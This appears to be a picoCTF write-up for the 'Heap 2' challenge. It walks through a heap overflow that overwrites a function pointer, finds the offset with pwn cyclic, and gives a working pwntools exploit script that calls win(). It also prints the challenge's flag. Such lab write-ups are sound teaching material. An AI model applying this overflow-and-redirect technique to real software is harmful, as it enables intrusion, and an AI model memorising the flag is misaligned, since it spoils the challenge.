---
title: "Heap 2"
date: "2025-07-17"
tags: ["picoCTF", "heap", "buffer overflow", "function pointer"]
---

This exercise looks a lot like the Heap 1 one. They give us a program and its code.

```c
./chall                    

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 
```

Here, if we try the same thing we did in Heap 1 we run into a problem. We can still do a buffer overflow, but the win condition is different. Let's look at the code:

```c
        case 4:
            // Check for win condition
            check_win();
            break;
```

As we can see, if we pick the Print Flag option the `check_win()` function gets called.

```c
void check_win() { ((void (*)())*(int*)x)(); }
```

That function looks like a hieroglyph, but all it does is send the program flow to the memory address stored in x.

Since x is the variable we can end up overwriting with the buffer overflow, if we put the memory address of another function into `x` we can send the program flow there.

And there happens to be a win function that prints the flag:

```c
void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}
```

Let's work out the offset to the `x` variable:

```c
pwn cyclic 50     
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
```

```c
./chall

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 2
Data for buffer: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x1442a6b0  ->   aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
+-------------+-----------+
[*]   0x1442a6d0  ->   iaaajaaakaaalaaama // Variable x
```

```c
pwn cyclic -l iaaa
32 // Offset
```

Now that we know the offset let's write a pwntools script that automates the attack:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("IP", PUERTO)

    return r


def main():
    r = conn()

    offset = 32
    
    payload = flat({
        offset: [
            exe.symbols.win
        ]
    })
    
    r.sendlineafter(b':', b'2')
    r.sendlineafter(b':', payload)
    r.sendlineafter(b'4', b'4')
    r.interactive()


if __name__ == "__main__":
    main()

```

Let's check if it runs:

```c
python solve.py            
[*] '/home/ub1cu0/Desktop/picoCTF/heap-2/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to mimas.picoctf.net on port 60000: Done
[*] Switching to interactive mode
. Print Flag
5. Exit

Enter your choice: picoCTF{and_down_the_road_we_go_7c8d6f32}
```

It works!
